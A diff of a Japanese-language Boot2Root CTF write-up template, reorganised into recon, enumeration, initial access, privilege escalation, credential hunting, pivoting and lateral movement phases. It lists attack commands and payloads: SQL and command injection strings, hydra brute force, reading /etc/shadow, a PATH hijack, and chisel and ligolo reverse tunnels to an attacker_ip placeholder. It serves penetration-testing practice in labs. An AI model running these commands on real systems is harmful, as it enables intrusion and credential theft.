@@ -1,8 +1,9 @@
 # Boot2Root - MachineName  
 （HackTheBox / VulnHub / TryHackMe）
 
-この Writeup は 1 台のマシンを Recon → Initial Access → PrivEsc → Root の流れで攻略する  
-Boot2Root 形式の攻略ログです。
+この Writeup は 1 台のマシンを  
+Recon → Enumeration → Initial Access → Local Enumeration → Privilege Escalation → Credential Hunting → Internal Enumeration → Pivot / Port Forward → Lateral Movement → Repeat → Root  
+の流れで攻略する Boot2Root 形式の攻略ログです。
 
 ---
 
@@ -10,325 +11,398 @@ Boot2Root 形式の攻略ログです。
 - IP: `10.10.x.x`
 - OS: Unknown（後で判明）
 - Difficulty: Easy / Medium / Hard
-- Tags: Web / SMB / FTP / SSH / PrivEsc / Linux / Windows
+- Tags: Web / SMB / FTP / SSH / PrivEsc / Pivot / Tunneling / Linux / Windows
 
 ---
 
-# 🔍 1. Recon（定石コマンド＋よくある罠）
+# 🎯 1. Recon（初動・外部調査）
 
-## 1-1. ポートスキャン（鉄板）
-Boot2Root の 90% は **nmap の初動で決まる**。
+外部から見える情報を集め、  
+**「どこから攻められるか」**  
+を把握するフェーズ。
 
-### 🔥 最強の初動（高速・広範囲・サービス判定）
-```
-nmap -p- -T4 -A -v 10.10.x.x
-```
+---
+## 🔎 1.1 Nmap（最重要・鉄板）
 
-### ポートだけ先に知りたい（高速）
+### ✔ コマンド
 ```
-nmap -p- --min-rate 5000 -v 10.10.x.x
-```
-
-### よく使う追加オプション
-```
--sC   → default scripts
--sV   → version detection
--O    → OS detection
---script vuln → 脆弱性スキャン
+nmap -p- -T4 -v <TARGET_IP>
+nmap -sC -sV -O -T4 <TARGET_IP>
+nmap --script vuln <TARGET_IP>
 ```
 
-### よくある罠
-- **80/443 だけ見て満足する → 実は 8080 / 8000 / 5000 が本命**
-- **UDP を見ない → DNS / SNMP / NTP が突破口**
-- **-sC -sV を付け忘れて情報不足になる**
+### ✔ 出力（証拠）
+```
+[ここに nmap の出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（Nmap）
+- **80/443 → Web（最も突破口が多い）**  
+- **21 → FTP（anonymous / write）**  
+- **22 → SSH（弱パスワード / 鍵）**  
+- **139/445 → SMB（認証情報 / share）**  
+- **3306 → MySQL（弱パスワード）**  
+- **6379 → Redis（未認証）**  
+- **8080/8000/5000 → 内部 Web の可能性**  
+- **古いバージョン → exploit の可能性**
+
 
 ---
 
-## 1-2. Web 調査（深掘り）
+## 🌐 1.2 DNS（名前解決の調査）
 
-### 🔥 まずは HTTP の基本情報
+### ✔ コマンド
 ```
+dig A <DOMAIN>
+dig ANY <DOMAIN>
+dig AXFR <DOMAIN> @<TARGET_IP>
+```
+
+### ✔ 出力（証拠）
+```
+[ここに dig の出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（DNS）
+- サブドメイン → admin / dev / staging  
+- AXFR が通る → 内部情報が大量に漏れる  
+
+---
+
+## 🧾 1.3 WHOIS（所有者情報）
+
+```
+whois example.com
+```
+
+### ✔ 出力（証拠）
+```
+[ここに WHOIS の出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（WHOIS）
+- メールアドレス → パスワード推測  
+- 組織名 → OSINT に利用  
+
+---
+
+## 🌐 1.4 HTTPヘッダ（Webの詳細情報）
+
+### ✔ コマンド
+```
+curl -I http://<TARGET_IP>
+```
+
+### ✔ 出力（証拠）
+```
+[ここに HTTP ヘッダの出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（HTTPヘッダ）
+- Server: Apache/2.4.29 → 古い  
+- X-Powered-By: PHP/5 → exploit 多い  
+- Location: /admin → 管理画面の存在  
+
+---
+
+## 🔐 1.5 SSL（証明書情報）
+
+### ✔ コマンド
+```
+openssl s_client -connect <TARGET_IP>:443
+```
+
+### ✔ 出力（証拠）
+```
+[ここに SSL 情報の出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（SSL）
+- CN / SAN → 内部ホスト名  
+- 古い暗号化方式 → 脆弱性の可能性  
+
+---
+
+## 📁 1.6 SMB（共有フォルダ）
+
+### ✔ コマンド
+```
+smbclient -N -L //<TARGET_IP>/
+smbclient //<TARGET_IP>/<SHARE>
+```
+
+### ✔ 出力（証拠）
+```
+[ここに SMB の出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（SMB）
+- anonymous → 認証不要  
+- .txt / .conf → 認証情報  
+- バックアップファイル → Web の初期侵入  
+
+---
+
+## 📂 1.7 FTP（ファイルサーバ）
+
+### ✔ コマンド
+```
+ftp <TARGET_IP>
+```
+
+### ✔ 出力（証拠）
+```
+[ここに FTP の出力を貼る]
+```
+
+### 🧠 突破口の見つけ方（FTP）
+- anonymous ログイン
+- 書き込み可能 → WebShell アップロード  
+- Web のソースコード → 脆弱性のヒント  
+
+---
+
+## 🎯 Recon のまとめ（攻撃の方向性を決める）
+
+Recon の目的は **「どこから攻められるか」** を決めること。
+
+- Web がある → ffuf / SQLi / RCE  
+- SMB がある → 認証情報 → Web/SSH  
+- FTP がある → WebShell アップロード  
+- DB がある → 弱パスワード → 横展開  
+- Redis がある → SSH key 書き込み  
+- ポートが少ない → 内部サービス → pivot 必須  
+
+
+---
+
+# 📡 2. Enumeration（外部サービスの詳細調査）
+
+## 2-1. Web
+```
+ffuf -u http://10.10.x.x/FUZZ -w common.txt -e php,txt,bak,old
 curl -I http://10.10.x.x
 ```
 
-### ディレクトリ探索（ffuf）
-```
-ffuf -u http://10.10.x.x/FUZZ -w /usr/share/wordlists/dirb/common.txt
-```
-
-### バーチャルホスト探索（定石）
-```
-ffuf -u http://10.10.x.x -H "Host: FUZZ" -w subdomains.txt
-```
-
-### JS / hidden API 調査（鉄板）
-```
-curl -s http://10.10.x.x | grep -E "api|js|admin|login"
-```
-
-### CMS 判定（よくある突破口）
-```
-whatweb http://10.10.x.x
-```
-
-### Web の突破口の定石
-- 古い CMS → RCE / File Upload  
-- admin パネル → 弱パスワード  
-- JS 内に API Key  
-- robots.txt → 隠しディレクトリ  
-- backup.zip → ソースコード流出  
-
-
-### よくある罠
-- **拡張子を探索しない → .php / .bak / .old が見逃される**
-  ```
-  ffuf -u http://10.10.x.x/FUZZ -w common.txt -e php,txt,bak,old
-  ```
-- **JS を見ない → API Key や hidden endpoint が隠れている**
-- **robots.txt を見ない → admin パネルが隠れている**
-
----
-
-## 1-3. SMB 調査（深掘り）
-
-### SMB の鉄板スキャン
-```
-nmap --script smb-enum-shares -p 445 10.10.x.x
-nmap --script smb-enum-users -p 445 10.10.x.x
-```
-
-### smbclient（匿名アクセス）
+## 2-2. SMB
 ```
 smbclient -N -L //10.10.x.x/
 ```
 
-### 共有フォルダにアクセス
-```
-smbclient //10.10.x.x/share
-```
-
-### SMB の突破口の定石
-- anonymous share → パスワードや config が落ちている  
-- .txt / .conf → 認証情報  
-- .ps1 → Windows の PrivEsc のヒント  
-- バックアップファイル → Web の初期侵入につながる  
-
----
-
-### よくある罠
-- **anonymous share を見逃す → 認証情報が落ちている**
-- **.txt / .conf を軽視 → パスワードがそのまま書かれている**
-- **SMB のファイルをローカルに保存しない → 後で解析できない**
-
----
-## 1-4. FTP 調査（深掘り）
-
-### 匿名ログイン
+## 2-3. FTP
 ```
 ftp 10.10.x.x
-Name: anonymous
-Password: anonymous
 ```
 
-### ファイル一覧
-```
-ls -la
-```
-
-### FTP の突破口の定石
-- anonymous → Web のソースコードが落ちている  
-- .php / .html → Web の脆弱性のヒント  
-- .txt → 認証情報  
-- 書き込み可能 → WebShell アップロード  
-
-
-### よくある罠
-- **anonymous login を試さない**
-- **書き込み可能か確認しない → WebShell アップロードの突破口**
-- **FTP 内の .php / .html を見逃す → Web の脆弱性のヒント**
-
----
-
-## 1-5. SSH 調査（深掘り）
-
-### バナー情報
+## 2-4. SSH
 ```
 ssh -v user@10.10.x.x
 ```
 
-### よくある突破口
-- 弱パスワード  
-- 公開鍵が SMB/FTP に落ちている  
-- Web のユーザー名と同じ  
-- config ファイルにヒント  
-
-### よくある罠
-- **Web のユーザー名と SSH のユーザー名が一致することに気づかない**
-- **SMB/FTP に落ちている鍵ファイルを使わない**
-- **authorized_keys を見逃す → 横展開のヒント**
+### 🧠 思考プロセス
+- JS → hidden API / key  
+- robots.txt → 隠しディレクトリ  
+- SMB/FTP → 認証情報が落ちている  
+- Web のユーザー名と SSH が一致する  
 
 ---
 
-# 🚪 2. Initial Access（侵入の糸口）
+# 🚪 3. Initial Access（初期侵入）
 
-## 2-1. Web Exploit（定石）
-### SQL Injection
+## 3-1. Web Exploit
 ```
 ' OR 1=1-- -
-```
-
-### よくある罠
-- **POST パラメータをテストしない → GET だけ見て終わる**
-- **Cookie をテストしない → Cookie Injection が突破口**
-
----
-
-### SSRF
-```
-http://127.0.0.1:80
-http://169.254.169.254/latest/meta-data/
-```
-
-### よくある罠
-- **URL エンコードを試さない → フィルタ bypass できない**
-- **DNS rebinding を知らない → 内部サービスに届かない**
-
----
-
-### Command Injection
-```
 ; cat /etc/passwd
+http://127.0.0.1:80
 ```
 
-### よくある罠
-- **スペースが使えない → ${IFS} を使う必要がある**
-- **フィルタが厳しい → base64 経由で bypass**
-
----
-
-### File Upload Bypass
-```
-shell.php.jpg
-shell.phtml
-```
-
-### よくある罠
-- **Content-Type を変更しない → バイパスできない**
-- **二重拡張子を試さない → .php.jpg が突破口**
-
----
-
-## 2-2. 弱パスワード / 認証突破
+## 3-2. 弱パスワード
 ```
 hydra -l admin -P rockyou.txt http://10.10.x.x/login
 ```
 
-### よくある罠
-- **rate limit を考慮しない → ロックされる**
-- **パスワードリストが弱い → rockyou.txt を使わない**
-
----
-
-## 2-3. Public Exploit（SearchSploit）
+## 3-3. Public Exploit
 ```
 searchsploit apache 2.4
-searchsploit openssl
 ```
 
-### よくある罠
-- **バージョンが微妙に違う → exploit が動かない**
-- **PoC をそのまま使う → カスタム修正が必要**
+### 🧠 思考プロセス
+- 入力欄 → SQLi / RCE  
+- URL 入力欄 → SSRF  
+- Cookie / Header も必ず試す  
 
 ---
 
-# 🧗 3. Privilege Escalation（よくある罠）
+# 🖥 4. Local Enumeration（侵入後のローカル調査）
 
-## 3-1. Linux PrivEsc（鉄板）
-
-### SUID
 ```
-find / -type f -perm -04000 -ls 2>/dev/null
-```
-
-### Capabilities
-```
-getcap -r / 2>/dev/null
+id
+whoami
+uname -a
+ls -la
+ps aux
 ```
 
-### 権限確認
+### 🧠 思考プロセス
+- 実行中のサービスを確認  
+- Web アプリのソースコードを探す  
+- 認証情報が落ちている可能性  
+
+---
+
+# 🧗 5. Privilege Escalation（権限昇格）
+
+## 5-1. Linux
 ```
 sudo -l
+find / -type f -perm -04000 -ls
+getcap -r /
 ```
 
-### PATH 攻撃
+## 5-2. Windows
 ```
-echo "/bin/bash" > /tmp/ls
-export PATH=/tmp:$PATH
-```
-
-### 定石ツール
-```
-linpeas.sh
-linux-exploit-suggester.sh
-```
-
-### よくある罠
-- **sudo -l を見逃す → ほぼ毎回突破口**
-- **SUID の “意外なコマンド” を見逃す → find / vim / less / awk**
-- **Capabilities を知らない → python3 cap_setuid が突破口**
-- **PATH 攻撃を知らない → root 取れない**
-
----
-
-## 3-2. Windows PrivEsc（鉄板）
-```
-whoami /priv
-sc qc <service>
 winPEAS.exe
+whoami /priv
 ```
 
-### よくある罠
-- **サービスの権限を見ない → unquoted service path が突破口**
-- **DLL hijacking を知らない**
-- **AlwaysInstallElevated を見逃す**
+### 🧠 思考プロセス
+- sudo -l → 最も突破口率が高い  
+- SUID → find / vim / less / awk  
+- Capabilities → python3 cap_setuid  
 
 ---
 
-# 🔁 4. Lateral Movement（よくある罠）
+# 🔑 6. Credential Hunting（認証情報探索）
+
 ```
-ssh -L 8080:internal:80 user@10.10.x.x
-ssh user@10.10.x.x
+grep -Ri "password" /
+grep -Ri "SECRET" /
+cat /etc/passwd
+cat /etc/shadow (権限があれば)
 ```
 
-### よくある罠
-- **内部ポートを見逃す → pivot しないと見えない**
-- **同じパスワードを試さない → credential reuse が突破口**
+### 🧠 思考プロセス
+- Web アプリの config  
+- DB の接続情報  
+- SSH の鍵  
+- SMB/FTP のパスワード  
 
 ---
 
-# 👑 5. Root（最終攻略）
+# 🛰 7. Internal Enumeration（内部ネットワーク探索）
+
+## 7-1. netstat
+```
+netstat -tunlp
+```
+
+## 7-2. ss
+```
+ss -tunlp
+```
+
+## 7-3. lsof
+```
+lsof -i -P -n
+```
+
+## 7-4. ネットワーク情報
+```
+ip a
+ip route
+```
+
+### 🧠 思考プロセス
+- 127.0.0.1:8000 → 内部 Web  
+- 3306 → MySQL  
+- 6379 → Redis  
+- 複数 NIC → pivot 必須  
+
+---
+
+# 🔁 8. Pivot / Port Forward（内部サービスへのアクセス）
+
+## 8-1. SSH Local Forward
+```
+ssh -L 8080:127.0.0.1:8000 user@10.10.x.x
+```
+
+## 8-2. SSH Dynamic Forward（SOCKS）
+```
+ssh -D 9050 user@10.10.x.x
+proxychains curl http://internal:8000
+```
+
+## 8-3. Chisel
+攻撃者側：
+```
+chisel server -p 9001 --reverse
+```
+
+ターゲット側：
+```
+chisel client attacker_ip:9001 R:socks
+```
+
+## 8-4. Ligolo-ng
+攻撃者側：
+```
+sudo ip tuntap add user tun0 mode tun
+sudo ip link set tun0 up
+ligolo-proxy -selfcert
+```
+
+ターゲット側：
+```
+./agent -connect attacker_ip:11601
+```
+
+### 🧠 思考プロセス
+- 内部 Web → RCE → 横展開  
+- 内部 DB → 認証情報 → SSH  
+- pivot → 内部ネットワーク全体を覗く  
+
+---
+
+# 🔀 9. Lateral Movement（横展開）
+
+```
+ssh user@internal-host
+```
+
+### 🧠 思考プロセス
+- credential reuse  
+- authorized_keys  
+- 内部サービスから別マシンへ  
+
+---
+
+# 🔁 10. Repeat（繰り返し）
+
+内部マシンでも同じ流れを繰り返す：
+
+Recon → Enumeration → Initial Access → Local Enum → PrivEsc → Credential Hunting → Internal Enum → Pivot → Lateral Movement
+
+---
+
+# 👑 11. Root（最終攻略）
+
 ```
 uname -a
 searchsploit linux kernel
 cat /root/root.txt
 ```
 
-### よくある罠
-- **Kernel exploit を試さない**
-- **cron を見逃す → root 権限で実行されている**
-- **/etc/sudoers を見逃す → ALL=(ALL) NOPASSWD が突破口**
+### 🧠 思考プロセス
+- Kernel exploit  
+- cron  
+- sudo misconfig  
+- root 権限で動くサービス  
 
 ---
 
-# 📝 6. Notes（気づき・学び）
+# 📝 12. Notes（気づき・学び）
 - このマシンのポイント  
 - 初心者がハマりやすい点  
-- 次に活かせるテクニック
+- 次に活かせるテクニック  
 
----
-
-# 🎯 7. Summary（まとめ）
-- 初動：nmap → ffuf → SMB/FTP  
-- 侵入：SQLi / RCE / 弱パスワード  
-- PrivEsc：SUID / Capabilities / sudo  
-- Root：Kernel exploit  
